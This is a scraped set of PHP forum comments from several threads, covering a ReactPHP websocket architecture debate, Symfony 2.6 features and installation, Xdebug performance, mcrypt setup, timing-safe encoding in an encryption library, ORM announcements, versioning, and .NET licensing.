&gt;why? The application is for a startup that has essentially two possible outcomes: growth into the hundreds of millions of active users or closing shop. Now, the full-scale userbase wouldn't happen even in the best of scenarios for 3-5 years, but you can't really just stop and rewrite the application in year 3, so I was tasked with designing it to function at scale, and the investors signed off on building the at-scale model as the initial version. Facebook encountered this problem and had to invent Hack essentially to compensate. &gt;What is it that you are trying to keep in memory, what happens if the power dissapears? The most important thing we're keeping in memory is client websocket connections. If power is lost, the clients initiate a reconnect and silently connect to a different server. &gt;I'm also a little confused since you say it is stateless and had garbage collection problems? It doesn't have GC problems, but I'm trying to head them off. PHP is designed to die. It's not really designed (at least until recently) to operate as a continuous process, and this means that its garbage collection is still something that can easily allow memory leaks that would crash a server if not careful. This has to do with how GC works in PHP (based on zvals and the "root" node), and how objects are always passed by reference. Because the process never dies, there are certain scopes within the PHP scripts that never exit, and thus the automatic releasing of variables and memory wouldn't happen. As for how it's stateless, the connections themselves and the application internally exist without any states... well, that isn't ENTIRELY true, but it's designed such that any individual "box" within the application can be rebooted without it affecting the state of any connections. &gt; Its making me wonder if you're trying to alleviate the initial bootstrap step of an application? No, the bootstrap step isn't really the part we're trying to work around. It's more the communication model with the client and the resource allocation on the servers. For instance, if my application has a thing it can do that is memory intensive and a thing that is processor intensive, the relative usages of those two parts at any given time can both trigger some autoscaling and balancing. However, both would be suited to different kinds of servers. This architecture lets us build out portions of the application on hardware that is best suited to its particular needs. A CPU intensive portion of the app can be broken out into its own sandbox and be given a CPU heavy server to run on without affecting the rest of the application.
I'll keep that in mind, thanks OP.
Looking at the account post history I smell a spammer trying to avoid auto-detection algorithms or something.
Can it do more than one thing at a time? Most servers written in PHP cannot due to the lack of a good built-in threading library.
Yes it can. That's actually one of the most important things about the architecture. 
more pls
49 dollars is expensive for a tutorial. And what the heck is Jquerry?
You are batshit crazy to have written this in PHP. Try Node or Go. 
This is an awesome update and I'm excited to see Symfony pushing for better developer experience. Reducing the amount of code we have to write to achieve the same things as in earlier versions makes me happy inside. I've been using 2.6 for the past few months now, here's some highlights you'll want to check out: - New VarDumper component. Adds a `dump()` function that saves its results to the DebugToolbar (you can go back and look at dumps you've made in past requests) as well as handling doctrine entities and cyclic dependancies nicely. You can debug Ajax requests from in the DebugToolbar now too. - New [shortcut methods in controllers](http://symfony.com/blog/new-in-symfony-2-6-new-shortcut-methods-for-controllers). `redirectToRoute()` instead of having to call `redirect()` and `generateUrl()` as well as `addFlash()` are only small updates but they mean less code. - [Security component improvements](http://symfony.com/blog/new-in-symfony-2-6-security-component-improvements) and `AbstractVoter`. We've been using following the Symfony best practises with Symfony 2.6 beta alongside Doctrine 2.5 (for Embeddables) and JMSDiExtraBundle for our most recent project and there's a massive cognitive load reduction as we're not dealing with tons of configuration files and namespaces. 
Node just didn't work for what it needed to do, and PHP with react is almost exactly like node. It's just the memory stuff you have to keep track of. 
Because it wasn't worth losing the things that make PHP otherwise perfect for this application. I just had to be aware of what to be mindful of during design. And because of the architecture, individual parts of the model can indeed be written in other languages. 
I struggle to believe that Symfony isn't one of the top 5 php frameworks. Or Zend for that matter. 
This is a godawful article. It's terribly written, terribly structured, poorly researched, and pointlessly opinionated. Even its fonts are messed up. This is a comparison of "frameworks" which doesn't even include Symfony 2 **or** Zend Framework. Utter trash content. 
Not sure how you made that leap.
Yeah, I'm going through that user's posts, and it seems... odd. An oddly scattered mix. I'm not sure what to make of it. 
I hope I'll never have to work for this company or use their products. Not to mention the quality of their article http://i.imgur.com/fbOrFpT.png mother of god... If the tab stays open long enough, it will eat up all available memory and crash.
All you really need is the [awesome documentation](http://symfony.com/doc/current/index.html).
There are so many reasons. Makes it hard to test, generally a bad idea to use the global namespace. Violates SOLID in a way, and it goes against the OO paradigm.
I was polite to explain why I do everything in this script. I am not smarter than any programmer. It's a shame mostly healthy discussion on the Internet always turn like this, but well, it's the Internet. 
&gt;Why any language? Why C? Why Node? Why Go? Why Obj-C? Why Java? Why APL? Because they are better suited to the task? Sure, I *could* write a website in Haskell, but why would I when I could do it in PHP? Pick the right tools for the job n' that. &gt;PHP is capable of doing cool things. I know. It also has its limitations. I know the PHP holy war has left people sensitive to this stuff, but you don't have to use PHP for *everything*. &gt;Sometimes the question to ask is "Why not PHP?", as one might be surprised. It seems OP had other, more important considerations for choosing PHP so good for him, but "let's see if X will surprise us!" is a *really* bad reason for picking X as a platform to base your whole business on.
The [book](http://symfony.com/doc/current/book/index.html) download currently 404's for the 2.6 English version :( No chance to find it in epub/mobi format, too?
seriously I'm spambot ????? did you went to college ??
&gt; New VarDumper component. Adds a dump() function that saves its results to the DebugToolbar (you can go back and look at dumps you've made in past requests) as well as handling doctrine entities and cyclic dependancies nicely. You can debug Ajax requests from in the DebugToolbar now too. Why would I want to do that instead of using breakpoints in my IDE? Just curious.
Having some trouble installing Symfony, so if anyone can help…? So according to the guide I run these two commands, and that should activate the Symfony command in a new terminal window: $ curl -LsS http://symfony.com/installer &gt; symfony.phar $ sudo mv symfony.phar /usr/local/bin/symfony But all I get is a permission denied on /usr/local/bin/symfony. The 'book' seems to have the installation process for v2.5. [OS X 10.9, PHP 5.4.x]
How I understand it, he wants to use one **URL** for all articles. That's definitely *not* how a (proper) CMS works.
Also dying for an ebook version of the docs if anyone knows of one.
Use Drupal the way it's meant to be used. I don't know Drupal, but I assume you can create blog posts with it. Each one will have its own URL but uses the same template.
Never heard of this method for installing. I'd recommend just using Composer to create the project in your working directory. See the main docs: http://symfony.com/doc/current/book/installation.html#option-1-composer Should work with 2.6.* as the version string.
It sounds like you need to modify the permissions of /usr/local/bin/symfony in order to run it as whatever user you're trying to run it as.
Was following the steps in [The Quick Tour Guide](http://symfony.com/doc/current/quick_tour/the_big_picture.html). But now trying other stuff. Thanks for the help. :)
Nice illegal usage of the Fallout Vault boy on your home page.
&gt; Because it wasn't worth losing the things that make PHP otherwise perfect for this application Like what? &gt;And because of the architecture, individual parts of the model can indeed be written in other languages. I am not sure why this can only be done using this 'architecture'. 
&gt; It's just the memory stuff you have to keep track of Yea, and that it real easy, you know. Dude, this is incredibly stupid. But I don't think this app will have to grow into "into the hundreds of millions of users", as you say (projects that start with this assumption seldom do). So I think you are pretty safe. I hope you learn from your experience. 
&gt; when you have not launched the IDE yet eg. coding in vim or quickfixing stuff on the dev server and you want to check some results. Ah, that's a good point.
I'll take a gues and say he's using Laravel, those static calls are calls to Laravel's facades/proxies.
This is so interesting! Just this week I started an experiment to bring familiar structure to ReactPHP-based apps: https://github.com/assertchris/spin
I'm glad. You're welcome.
by textbook composition fallacy 
&gt; It also has its limitations. Yea, and i would say that this is no longer one of the limitations
That doesn't change a thing. It's horrible either way.
I can only say that i can see lot of haters here this company must be really good otherwise wgy so many haters posting such negative comments, while it was a pretty normal article.
interesting. But this would only work in ideal environment. On heavy loaded server and some brute force protection you can get enough data to get averages.
Just give it a bit. Everyone who can fix it are on a train/plane right now.... I sent a message to Ryan Weaver, hopefully he can fix it when hes done traveling.
Not everyone uses xdebug(or whatever you are using). I haven't for awhile, because it drastically slows down my app. 
No, the new best practice is about to be to use the [Symfony Installer](https://github.com/symfony/symfony-installer), though it hasn't been added to the "Download" page. 
https://github.com/symfony/symfony-installer
Their docs do also say to `chmod a+x` it, but yeah, i think you may have to do more /u/InAnIndianAccent .
Yeah I found it with a search, but I meant that I've never seen it used or recommended in my experience with Symfony teams and projects. Not sure I really see the point..? Why should Symfony have its own dedicated installer when Composer already solves the problem perfectly well? Just adds another tool to configure, set of commands to learn, etc.
I can't imagine going back to developing without debugging tools. My productivity and ability to diagnosis and solve problems increased dramatically back when I first learned how to use breakpoints and such. Being able to output some variables is nice for the reasons stated above by /u/jamesmoss85, but it really is no substitute for a proper debugging suite. To each his own I guess.
jesus christ, do you people even read the fucking articles?
When i enable xdebug, the page generation time skyrockets from 350ms to 1.5-1.6s on one of my projects, this is unacceptable (intel i5, ssd). I hope phpdbg (when it's ready and supported by IDE's) will not cause the same issue.
I think this is more suited for /r/programmerhumor
It is semi-serious. If it weren't for the fact it deletes itself, it'd be perfectly usable. **EDIT:** ~~Although, [I'm trying to change that](https://github.com/igorw/yolo/issues/28)~~ It was fixed, yolo no longer deletes itself.
Just in case anyone isn't familiar with Forge, it isn't just for Laravel. Works great with Silex, Symfony, Zend, or no framework at all, etc.
&gt; has a site that uses comic-sans and marquees, you can hardly call it semi-serious. Yes, *semi-*serious. It's not a complete joke, it ~~was (until it started deleting itself)~~ (**EDIT:** is) a completely usable framework.
Are you using Doctrine 2.5 in production? As much as I want Embeddables, I can't justify relying on unstable code in production.
If I'm not wrong Fabien Potencier has announced that he works on a php application server written in go http://www.youtube.com/watch?v=gpNbmEnRLBU&amp;t=16m30s 
Do you have the profiler or tracer set to run automatically? You might be able to tweak the settings a bit. For me, using Vagrant on Virtualbox with a Ubuntu 12.04LTS instance, I don't have those kinds of page load times even with a rather large Symfony2 application.
Just to point out that when dealing with encryption keys, there should be no need for any kind of decoding (hex2bin or base64_decode). It's exactly this extra "functioning bit" that such decoding operations cause that can cause subtle security issues. Instead, use proper hashing functions to turn the, say, hex encoded data into a proper encryption key. This way, you don't need to worry about hex2bin possibly leaking exploitable information (SHA-2 functions are safe in this regard that there is no such branching or indexing).
Symfony + Xdebug on Windows = slow as hell. Even after installing caching extension from MS. I tried Vagrant in Virtualbox and it's faster, but unfortunately Virtualbox only supports 1 core and 512 Mb of RAM on my PC, so it's still pretty slow.
If you are using a mac, get homebrew man. It's awesome. My guess is there is a updated brew with latest Symfony.
mcrypt is a pain in the arse. I'd recommend setting up a Vagrant box to host a LAMP stack locally. Basically it works as a server hosted on a virtual machine on your computer, dead handy for cross-platform development. There's plenty of documentation out there https://www.vagrantup.com/
Maybe. Let me explain my use case. I'm working on an in-house application framework (some components have been open sourced), and one of the things I've built is an encryption library. Upon deploying the framework, I store 32 bytes of `/dev/urandom` output in a commented JSON configuration file. When it comes time to use it, this value is run through `hash_pbkdf2()` to derive the encryption and authentication keys. Throughout the encryption library, the following functions are used either on IVs, ciphertext, HMAC outputs, and/or encryption keys: * `base64_encode()` * `base64_decode()` * `bin2hex()` * `hex2bin()` A portable variant of my library is available here: https://github.com/resonantcore/lib/blob/master/src/Security/SAFE.php Note that the one I'm using in my framework is a little more coupled into the framework design (e.g. there's a registry singleton that contains the master keys). My goal with this pull request is to have this code not fall prey to cache-timing attacks *without requiring people to install a PECL extension to be safe*. (If you're fine with PECL, just use libsodium.)
This looks great :).
It's the *only* PHP framework with a built-in Lisp dialect!
&gt; but they just aren't working. explain
I know how, i just chose not to. If I'm having a problem that i can't solve in 2 minutes from the stack trace, ill turn on/install xdebug.
Hey Ivo, so when I try and put the dll files in the ext folder with my other php extensions, and then I look at the list of available extensions through the WAMP interface, they have a "!" with a triangle around it, indicating that it's not working. All in all I am literally looking for something simple that can just encrypt a line of text, and then be able to return it and decrypt it if I want to. Super simple (or so I thought) but I am having trouble finding any way for me to do this... if you have any suggestions (doesn't have to be mcrypt or anything) please fire away!
What /u/hiimkarma said, plus, the symfony installer will also work offline in some cases. &gt; Just adds another tool to configure, set of commands to learn, etc. Nothing to configure, and one command to run. Those are terrible arguments :/ 
Just because its humorous, doesn't mean is doesn't belong here.
make a php file somewhere (any name), and write &lt;?php phpinfo(); ?&gt; in it, then load the path in a browser, it will list all the extensions available to your php. It will also tell you the exact path of the php.ini that's being used to configure php, make sure you've been editing the right one. Also make sure to restart the web server once changing the configuration.
Seldaek's demo appears to actually be down right now, as i think someone may have killed it. Can demo it here: https://nimbus-aequasi.herokuapp.com/
Ubuntu example : sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available sudo php5enmod mcrypt sudo service apache2 restart Found this on stackoverflow as i vaguely remembered i had a similar problem a while ago. Is your mcrypt module properly registered in php5 config / ini ? * edit as i made a booboo concerning the OS : is the module correctly showing in the wamp config? afaik wamp has a nice config panel so you could check if the modifications in the ini file were correctly done. Also did you do a restart and a check of the log files?
Yes. lol. Seldaek made it in about 30 minutes, in between talks during SymfonyCon. But it actually works?
&gt; on Windows Well, there's your problem. :p EDIT: Actually, I do remember some of my co-workers complaining about xdebug making our app painfully slow. And come to think of it, they all use Windows boxes. I'm on Linux, and don't really notice it too much. I mean yeah, it's not as fast as production, but that's a development environment for ya.
&gt; WAMP Server Your response: &gt; Ubuntu Example : Not terribly helpful to OP.
Oops, forgot what the W stands for.. but mcrypt still needs to be registerd with php i guess.
People have antiquated perceptions of PHP as well. People look at PHP as the language they inherited from some doofus when they were a junior developer 10 years ago. Modern PHP (which Wordpress DOES NOT count) are worlds apart to what most people originally wrote as PHP.
I almost shit my pants until I realized it was a joke. 10/10
Proper grammar, punctuation and clarity are very important when you want to be understood and appreciated an the Internet. Both your comments and the article itself are lacking this regard.
What's the point of &gt; echo "Mislukt"; *after* the die? O.o
I've always just used bcrypt. [Check here for more information](http://stackoverflow.com/questions/4795385/how-do-you-use-bcrypt-for-hashing-passwords-in-php/6337021#6337021) Edit: Classic /r/PHP. Downvoted for providing a useful alternative.
Actually I was not suggesting that you to use node. Just use a normal load balancer and web server. If you think It won't work, just post your reasons in sufficient depth to /r/php and /r/programming, so that other people can actually validate them. I strongly suggest you do this before spending any time on this. You should have done this before starting some thing like this, but anyway..
Do you honestly think this is just some sort of whimsical thing for us? What do you think, that we read a "how to create an application for dummies" book or something? This isn't something that was solely my decision or my responsibility, and you're nuts if you think we could close the kind of funding we have without validating assumptions that large. 
I don't have to assume anything if you would actually explain your reasons. I mean no offense, actually. I am just being direct.
No, I understand, but I didn't make this past to validate management and business justifications for technical decision to anyone. I made it to find out what aspects of what we *are* doing might be interesting to the PHP community. 
Here's the complete list of OWASP Cheat Sheets: https://www.owasp.org/index.php/Cheat_Sheets
&gt; I didn't make this post to validate management and business justifications for technical decision to anyone. It is not to justify someone. It is to prevent you from doing (or continue doing) something stupid, and use the experience of other who might have gone through the same mistake before you.
No I'm saying we went through that step already. :) 
 grammar, punctuation and clarity in comments????? seriously am I writing for thesis or what ?? this is a social bookmarking site b!tch, not sure about article though if they have such mistakes they should correct it.
Let's do that through PM, and I'm at a party right now, so it'll have to wait until Monday if you want to go in depth. 
just copy and paste this?
From what I've seen in the wild, "auto download"/"your download will begin shortly" pages usually use a redirect from their waiting page to the download URL. If the file is downloaded and not displayed, I believe most browsers will stay on the waiting page. For example, SourceForge appears to use an artificial delay to get more exposure of ads on the download page, then redirects via Javascript to make the file download: // (Javascript) SF.downloadDelay = 5000; SF.filename = '/4.1.1/binaries/en-US/Apache_OpenOffice_4.1.1_Linux_x86-64_install-rpm_en-US.tar.gz';
so my goal is for it now to have a blank white page but to display what is on the page while preforming the download function any ideas?
That is just absolutely incorrect **Edit** I don't know why I was down voted, sure I guess it wasn't constructive. but Chrome I know for a fact will download files without prompting the user to accept.
If you're using nginx, you can use the x-send-file header http://wiki.nginx.org/XSendfile
&gt; Makes it hard to test Not really. You can stuff whatever mock objects you want into the container. &gt; generally a bad idea to use the global namespace Not a valid argument w/out explaining why global is bad. I find a handful of global objects that are used throughout the application are very handy and reduce complexity quite a bit. &gt; Violates SOLID in a way, and it goes against the OO paradigm. SOLID is mostly okay IMO, but some people get a bit extreme with it. I don't know how this violates OO though; we're still using objects here. And there's been a lot of anti-OO hub-bub in recent years. I think the real issue here is that it makes the objects harder to work with. If you want to re-use the class in another project, you might include it, and you can instantiate it with no problem because it doesn't declare any dependencies in its constructor, but then it craps out the second you call a method that hasn't been inserted into the container. Which is unfortunate because I don't think having to pre-instantiate every possible dependency an object *might* need to feed it to the constructor is a very good solution either. I think we need a way to define *definite* dependencies, and *possible* dependencies, and still allow a way to lazy-load them. 
&gt; That is just absolutely incorrect That is just absolutely incorrect. (As unsubstantiated imperatives usually are.) Each mainstream web browser will prompt for user permission before storing a transferred resource into a local file. There are no silent or secretive background downloads (which OP is actually after), unless inline disposed for an in-browser associated media type.
&gt; It's faster at being node than node is Got any sources for that? I have looked at ReactPHP previously (someone was even running a modified version of Symfony 2 in react to overcome bootstrapping), but in the end I ended up using nodejs.
How does it do that? Socket based communication with other servers, or some sort of async wrapper around IO?
A combination of both actually. An async wrapper around socket communication with other servers. 
I'll try and provide you with some of the sources on Monday when I get into the office. 
For our sins we are. At the moment we've used it on two projects, one is live the other is in the final stages of development I do worry about it but we haven't run into any issues yet and the use of value objects has saved us lots of time and code.
Interesting, just watched the whole talk and read http://marcjschmidt.de/blog/2014/02/08/php-high-performance.html (where the graphs in the talk are from). Cool stuff, did not know Fabien was doing that. I can't seem to find any more information about it tho.
PHP'ing, like it's ... 19 90 9... 
I am not sure what you meant, but I believe I can do it. Open an issue with some examples and I will make a look for you.
Exactly my thoughts. Such PHP much SOLID OOP.
Aura router is good IMHO
;-)
`class Users extends Table` aaaaand I stopped reading.
What benefits/differences does this have in comparison to eloquent and doctrine?
Compared to doctrine, its simpler and has less things going on under the hood. Anybody who has used both doctrine and eloquent will tell you that eloquent requires lesser ceremony, and doesn't do as many things as doctrine, but it just does those which are needed most very well. That's what div aims for too. Compared to eloquent, 1. div offers you a clear separation between persistence and data. All the classes etc that you define are just defining your schema in php. The data that you recieve in the end is just data, Model and Collection objects. You write your business logic around this data, and can easily swap your data sources with something else if needed. And 2. It offers you an orm object (similar to doctrine's entity manager) which you can inject into various services as needed. This might seem like a small thing, but is actually very helpful in proper OOD
I've renamed the folder to `src` :)
Not sure if this really the datamapper pattern: `class Users extends Table` Also the notion of a Table is related to a database, the ORM is supposed to abstract that away. Thats why you have entities and repositories.
Please check out the Model class (https://github.com/kapv89/div/blob/master/src/Model.php) and the collection class(https://github.com/kapv89/div/blob/master/src/Collection.php). These are the classes you get your data in. Doctrine uses yaml configs to describe the structure of schema to the orm, div uses classes. That's it, that's the sole role of classes. The data you get in the end is just data. And you can override the classes used to represent model and collection data on a per class basis
I should stab myself for using the term `Model`, as you obviously confused what I meant. The point of using a mapper is coding your own stuff (entities/VOs/domain logic) and then binding the data to it via "mapping". This is something that many doctrine users also get wrong (I'm looking at you, evil people that generate models from your database!).
Those are next up in my todo list. Should've probably done em before hand
No offense intended but as someone who's actually worked for big business with big money, I have absolutly no doubts you could convince someone to fund such an architecture without any real justification. Personally, I'd put my money on traditional architectures with typical non-performant frameworks being good enough until you have a product and traction, but hey, at least you got to do cool stuff. 
If you read through the docs, you'll find that that's all what div does
Python. Go. Ruby. JavaScript. In fact pretty much anything other than .NET
&gt; its way more simpler &gt; way less going on &gt; way less ceremony &gt; does way less things Please. Stop. I really like the project, I think it's a great idea. But the way you write is kind of painful. This most of all. 
&gt; I'd recommend against ASP.NET. It's a good career move, but jobs are easier to find than souls. I'm not quite sure what you mean by this. Care to expand? 
Learn .net or convince your boss python could also be a good career move and benefit the company.
Not much to it really. I just don't like the Windows development environment or attitude.
Maybe they're not a native speaker and honestly their language doesn't matter at all does it? Not everybody has a huge vocabulary. If you like the tool then use it but don't belittle the person for speaking in a manner that you don't like.
&gt;I just don't like the Windows development environment or attitude. And what about these is it that you don't like? 
M$ /s
Not a native english speaker, still corrected corrected whatever things you pointed out.
Nearly 2-years ago I branched out and did some API work with Node.js. I really enjoyed it, both technically and because of the thriving community. I'm currently at a company that uses mostly Ruby and Golang, I'm on a team that uses RoR. It's alright, some of the tooling is pretty impressive. Sometimes I miss PHP and would like to do more Node.js, but I think it's worth learning other languages as it really causes you to think about languages in general. It will improve your CS fundamentals and make you a better programmer in general. 
Mislukt is "failed" in dutch. Just to let me know if the connection was a succes when i was debugging my code. I'm new to php and Mysql so I divided the process in steps, step 1 was checking if i made the connection, Hence the echo.
You have basically three directions you can move. I view web development as a spectrum of responsibilities. As companies get larger, they divide it into more and more pieces, but I'm generally working at places that put it into four: designer, front-end, backend, sysadmin. Most people tend to focus on one section, then have a secondary skill set in an adjacent area. You've got designers who code a bit, JavaScript devs who design a bit, backend devs who fill in as sysadmin when necessary, etc. So, in light of that, you can develop skills on either side of where you currently are, depending on your interests. You can also stay in the same place, but just learn new technologies to do what you're doing, but that's usually not very interesting. Finally, you can step out into the third dimension and use your current skills and knowledge to do something that's not web dev. Now, what you choose is up to you; it's dependent on your skills, interests, and opportunities. But having a framework for thinking about it can be useful. Edit: Btw, python is incredibly useful in web dev, and just about any field (other than high-performance stuff where c and c++ are still king). reddit, for instance, is written in python.
"It's windows so I don't like it" He probably hasn't done a day of it in his life.
You *are* aware that [.NET is open source](https://github.com/Microsoft/dotnet) now, right? And it's getting official support for every OS? Not that "Windows development" was a good argument in the first place.
I'm having fun with the mean stack, might be worth looking into.
You can try it. What I gave you should put you in the right direction. It looks like you had most of it already. Very rarely will a copy and paste just simply work, look into how the different lines of what your copying are doing, understand what you are copying. You can get yourself into a lot of trouble blindy copying and pasting code if you don't understand what it is doing. As stated below, what is common practice is to have a normal html page that will say something like "Your file is download, please wait". then on that same page, have a Iframe, or a ajax call that will call the script above, which will cause the actual download to occur. 
This approach is new to me. Didn't even know there was a 'Symfony Installer'. All I do to setup a new Symfony project is $ composer create-project symfony/framework-standard-edition:2.6.* mynewprojectfolder If your composer isn't installed/happy, try getting it with homebrew: brew update brew tap homebrew/dupes brew tap homebrew/php brew install composer
great tool!...
The one that will save me the most time is [the Bootstrap form theme](http://symfony.com/blog/new-in-symfony-2-6-bootstrap-form-theme). I have my own [noccylabs/foundation-bundle](https://packagist.org/packages/noccylabs/foundation-bundle) to load jquery, bootstrap and more from CDNs so this should mean instantly fresh forms from the start.
&gt; As I understand it, they went with the MIT license, not the GPL. MIT is better I think. If you take their .NET code and use it for something proprietary you don't have to open-source anything. &gt; if everything you build is in that environment, then it makes for a nice walled garden where you don't need to account for a multitude of variables. I don't know what you mean by that. If you use .NET, you can write in C#, F#, Managed C, IronPython, Boo and a dozen other languages, share assemblies, and have them all work seamlessly together. You can use it on IIS or Apache or whatever you want. If you want to communicate with services that aren't .NET, you can use a REST protocol like you'd do with any other language. How is this "walled"? If anything you have *more* options with .NET because you have a common platform. Same goes for Java, but you can't say the same for Ruby, Python or PHP. &gt; Windows is a dying platform I very much doubt that that, but Windows != Microsoft != .NET. Even if the former two die, I think there's a big enough user base that .NET will live for a long long time. That said, you're not boxing yourself in by choosing one of these technologies. Many companies will hire you regardless of what languages you know; there's so much more to programming than the languages you use.
Ruby is good transition. Lots of Ruby work out there depending on where you live and what type of clients your company has. 
I'd recommend against listening to mattaugamer at all. He's a clueless idiot.
I would recommend trying to switch out parts of the stack, one at a time. Try working with Nginx instead of Apache. Try using Mongo, Redis, Postgres instead of MySQL. Try using Python, Java, Go, or Node in place of PHP. But I must stress that you should do it one at a time.
&gt; MIT is better I think. If you take their .NET code and use it for something proprietary you don't have to open-source anything. This is probably where we have our primary differences. I don't see a need to use open-source tools to make closed-source software. I also think the future is OSS, with Apple perhaps being the lone hold out still clinging to proprietary software (which, somewhat ironically, is also built on OSS). &gt; I don't know what you mean by that. If you use .NET, you can write in C#, F#, Managed C, IronPython, Boo and a dozen other languages, share assemblies, and have them all work seamlessly together. *If* you use .Net, sure. But what if you aren't interested in using .Net for a particular task? Which leads me to... &gt; How is this "walled"? If anything you have more options with .NET because you have a common platform. Same goes for Java, but you can't say the same for Ruby, Python or PHP. ...perhaps saying "walled garden" was a poor descriptor. I meant more along the lines of "in a corporate environment with a reliance on the Microsoft ecosystem" There's no doubt that .Net thrives in those places. Basically, if you're writing software that will need to run native on Windows, then you can't really go wrong with some sort of .Net implementation. And, in those instances, you do have the options you listed above that work well within .Net (mostly b/c many were developed by Microsoft to explicitly do so). But, if you're looking more broadly and/or aren't interested in a native Windows app, then you have options outside of .Net. Furthermore, as noted above, you have options that don't fall under the MIT license which can be closed or locked down later. If I were a startup, looking at my options, I don't find a compelling reason to build an application in .Net. Windows Phone is, at best, a distant third. The Surface tablet is viable, but I'd argue that's only because it can run desktop software. And, since I see the Windows hegemony losing ground to mobile, I'm not willing to bet on writing software that *targets* the Surface, as opposed to something that can run on Android or iOS, or, better yet, in the browser. PHP, Python, Ruby, Javascript and Go all seem like better options for such things than tying myself to something that is owned by Microsoft. &gt; there's so much more to programming than the languages you use. I agree with this 100%. I was simply pointing out why, IMO, .Net isn't something that I would be interested in putting the effort into learning. But that's not the same as saying that *nobody* should learn it, nor was I saying OP shouldn't. I was simply making a statement with regards to what I see as the limitations of making that choice. Again, a lot of this falls back to my feelings with regards to FLOSS and Microsoft's history (notably Ballmer calling it a "cancer" [http://www.theregister.co.uk/2001/06/02/ballmer_linux_is_a_cancer/]), I'm willing to give the new CEO the benefit of the doubt, but it will take more than a single MIT license to convince me of a wholesale change in attitude. To that end, for me, .Net is a limiting choice because it's owned by a company that I distrust.
On your demo page, the Facebook login button says "Signin with Google". Also not to nitpick non-code, but "sign in" is two words on the main button, but one word in the social buttons- you also use all three variants of "sign in", "sign up", and "log in".
what? "It's been shown that you can remotely detect differences in time down to about 15 nanoseconds using a sample size of about 49,000 (so 49,000 tries instead of 3 in the above example)." You can't make 49,000 request on server width brute force protection. It would lock you out after 10 wrong attempts.
Ignore those downvotes. The value of the GPL is undeniable. The FSF and RMS knew what they were doing then, and whenever they or he rant away, generally he is proven correct even if after a few years. RMS has never had to admit he was wrong in these matters, because he never is. Coming back to the point, MIT is risky, but with the vast majority of devs using some FLOSS toolkit or the other all the time, there will never be a case of MS taking "the best" and closing it. Perl, Python, PHP guys will never migrate to C# - those 3 have their proper place in the LAMP world which isn't going anywhere. And if MS takes an awesome .Net codebase and comes up with Windows X which is UNIX + C# based or something, that wont change the minds of any of the linux users. They might succeed to an extent on the desktop and might get mindshare with newcomers. But by then Linux will have some more incredible features which will blow them out of the water. Linux is already thoroughly in complete control of the embedded space - Windows doesn't really exist in comparison. And the GPL will keep Linux ahead of any MS-UNIX-C# closed bastard child. Note that embedded == smart devices - wearable computing like Google Glass, Smart Watches, smart homes, robotics, automation, etc. And linux + C will continue to outshine anything else in these fields. The real battle is to make cloud providers respect our privacy - and encryption - Amazon, Google, IBM, HP, Rackspace, etc. Even there the battlefield will be linux + bash + C / Python mostly. EDIT: GNOME and KDE will keep making blunders, Mozilla might also flounder a bit, but overall the threat period has gone. Yes, TPP / SOPA / DMCA style legislation is a risk that remains. /rant over EDIT2: but C# is a good language, once you remove the proprietary bits, and that will help a lot of programmers learn programming well and get introduced to Linux the easy way, rather than stay stuck on Windows. If anything it's another exit point from Windows. Holes allow water both ways as long as there is no legislation valve.
Hey, so I added annotations. That removes one excuse to not try it out.
Well said, and much better than my attempts. Thank you. I should note that I wasn't trying to dissuade anyone from choosing any direction, just to clear up the notion that not all "Open Source" is created equal. I also have nothing against the MIT License per se, but do find it telling that it's the license MS have chosen. If C# is your bag, then by all means, take it and run. I'm not telling anyone that their choice is inferior to mine. I was simply trying to explain my choices should the OP find that they feel the same.
From semver.org: &gt;Given a version number MAJOR.MINOR.PATCH, increment the: &gt;MAJOR version when you make incompatible API changes, If Laravel upgrade does not change your application API, no need to bump its version.
Ok but if the library is your primary dependency and it make backwards breaking changes, should you consider your library having done also? I'm not entirely sure there's a right or wrong answer here (though maybe there is) just looking for community opinions.
I agree with your rant about the php community 
&gt; Java for native Android development holds some appeal, though it's less necessary these days with robust responsive options for websites. &gt; Python interests me, more for tinkering with Raspberry Pi than anything. &gt; My boss wants me to branch out into ASP.NET to expand our offerings for larger clients. Good career move, though I personally find it distasteful. All very good points. Python seems to be a really educative language. The other good one I *hear about* is Scala. C never gets old, but I doubt in your shop it will have much of a place, considering how your boss wants to get into .Net for enterprise. I'd suggest learning a new language which has a slightly different set of paradigms than PHP (of course, PHP has integrated / half-assed many into itself over time) because the more different ways of thinking and structuring a solution that you know, the more you are able to produce code that solves the exact problem at hand - best tool for the job *and* best solution architecture / algorithm for the problem at hand. Given cloud computing and SaaS, using multiple languages might become a necessity - it often is in enterprise systems - something old and steady runs in UNIX/C++, something newer runs in Enterprise Java and something brand new runs in PHP/Ruby/Python maybe with a JS front-end and you need to manage all of them for a particular business - banking, finance, ticketing, and travel for example. So learn a new tool that also teaches a new way of programming. That will add a lot to your quality as a developer. /my opinion
What advantages does this offer over NotORM?
&gt; Facebook encountered this problem and had to invent Hack essentially to compensate. Presently HHVM does not do any performance optimizations for Hack that it does not do for PHP. HHVM was built in part to help with their scaling problems (and operating costs). Hack is to help them do more powerful static analysis; this helps them catch bugs sooner and do safer refactoring.
So no but then yes? Sorry don't follow.
Interesting, I have not seen this one before, and they are indeed extremely similar. At a cursory glance of the documentation and source code, I can spot a few differences: NotORM advantages: * Custom field selection &amp; join support (Selective has this under the hood but no API yet) * Support for Oracle &amp; PostgreSQL * Works in PHP 5.1/5.2 (Selective requires 5.3+) Selective advantages: * Modern code practices like PSR-*, composer support, PHPUnit instead of phpt tests * Faster schema reverse-engineering for MySQL * Limit and offset (pagination) support in all drivers * Multi-column primary key support * API to get table structures/column definitions (in NotORM, it's hidden under the hood) * Option to lazy or eager-load related records * Option to iterate over result sets as an unbuffered stream, whereas NotORM is always buffered
You can if you space them out?
You proved yourself wrong when you linked to a *Model* class. If I have to extend a library class to write my model, then you are not mapping **my** model to a database. My model is my model, ORMs should mess with it.
I like the unbuffered support. That is a huge plus.
Made sense to me. He said if you need to change the public interface to your lib, you'll need to change the version. Otherwise, you don't.
If YOUR api did not change, then YOU do not bump your version number. Unless you break BC, to change how your code deals with the aforementioned library, there is no need to change your major version. 
&gt; I won't open-source my money-making core applications that allow my business to exist. You have every right to do so, and I never meant to imply you didn't. It's just not what I would do, and therein lies our difference of opinion. Not right, not wrong, just different.
&gt; This is probably where we have our primary differences. I don't see a need to use open-source tools to make closed-source software. So everything you've ever created with PHP was FOSS? Call me skeptical.
